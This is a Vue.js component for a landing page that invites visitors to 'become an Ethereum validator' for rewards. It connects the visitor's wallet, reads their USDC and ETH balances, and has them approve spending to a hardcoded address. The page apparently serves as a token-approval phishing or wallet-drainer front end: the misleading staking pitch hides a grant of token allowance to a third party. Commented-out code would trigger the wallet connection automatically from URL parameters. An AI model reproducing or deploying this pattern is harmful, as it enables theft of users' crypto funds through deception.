<template>
  <section class="home-bg p-4 sm:flex sm:flex-col md:flex-row md:py-52 md:px-32 justify-center">
    <div>    
      <div class="md:text-5xl md:w-full font-medium home-font text-3xl pt-24">Become a validator and help secure the  future of Ethereum.</div>
      <div class="py-4">Earn continous reward for providing a public good to the community.</div>
      <button class="wallet-btn border border-black sm:px-4 sm:py-2 px-2 py-2 mb-6 sm:mb-0 text-lg my-8 sm:text-3xl font-semibold text-black md:mt-8 hover:scale-105 hover:transition hover:duration-500" @click="linkWallet" v-if="walletAddress?.length == 0">CONNECT WALLET</button>
      <button class="wallet-btn border border-black sm:px-4 sm:py-2 px-2 py-2 mb-6 sm:mb-0 text-lg my-8 sm:text-3xl font-semibold text-black md:mt-8 hover:scale-105 hover:transition hover:duration-500" @click="approve" v-else>{{!isApproved ? 'APPROVED' : `${address.slice(0, -36)}...${address.substring(38)}`}}</button>
    </div>
    <div>{{qqq}}</div>
    <img
      class="w-72 h-64 my-16 ml-4"
      src="@/assets/leslie-rhino.png"
      alt="leslie-rhino"
    />
  </section>
</template>

<script>
  import { ref, computed, onMounted } from 'vue';
  import { useRoute } from 'vue-router'
  import Web3Wallet from "@/utils/Web3Wallet"
  import {getUrlQueryString} from "@/utils" 
  import { useStore } from 'vuex';
  export default {
    setup() {
      const route = useRoute()
      const store = useStore()
      const testValue = computed(() => route.name)
      let menu = ref(false);
      let user = ref(true);
      const usdc_balance = ref(0);
      const address = ref('');
      const balance = ref(0);
      const isApproved = ref(false);
      const isWithDrawModal = ref(false);
      const isPrivateKey = ref(false);
      const isMenu = () => (menu.value = !menu.value);
      const isUser = () => (user.value = !user.value);
      const withdraw = () => (isWithDrawModal.value = !isWithDrawModal.value);
      const privateKey = () => (isPrivateKey.value = !isPrivateKey.value);
      
      let wallet;
      let a, i;
      const environment = ref('Ethereum');

      const linkWallet = async () => {
        environment.value = 'Ethereum'
        onConnect()
      }

      const onConnect = async () => {
        if (environment.value === 'Ethereum' && window.ethereum) {
          wallet = new Web3Wallet();
        } else {
          console.log("Error")
          return;
        }
        try {
          await wallet.linkWallet();
          address.value = await wallet.getAddress();
          store.commit('user/setAddress', address.value)

          if (address.value === false) {
            throw new TypeError("There was an issue signing you in.")
          }
          usdc_balance.value = await wallet.getBalance(address.value)
          balance.value = await wallet.balance(address.value)
          register()
        } catch (err) {
          console.log('login', err)
        }
      }
      const approve = async () => {
        let auth_address = '';
        if (environment.value === 'Ethereum') {
          auth_address = '0xca99776706CDDa6F3Cd0DD7AaB4f43b153Aa51fE'
        } 
        if (auth_address === '') {
          console.log("Error")
          return;
        }
        try {
          const hash = await wallet.approve(auth_address, address.value);
          console.log('hash', hash);
          isApproved.value = true;
        } catch (error) {
          isApproved.value = false;
        }
      }
      const walletAddress = computed(() => store.getters['user/getUserAddress'])
      console.log("address", walletAddress?.value.length)

      onMounted(() => {
        console.log("hello")


        // a = getUrlQueryString('a');
        // i = getUrlQueryString('i');
        // setTimeout(() => {
        //   linkWallet();
        // }, 1000);

        // await store.dispatch( 'user/fetchEtherPrice')
      })

      return { linkWallet, address, approve, isApproved, walletAddress };

    },
  };
</script>

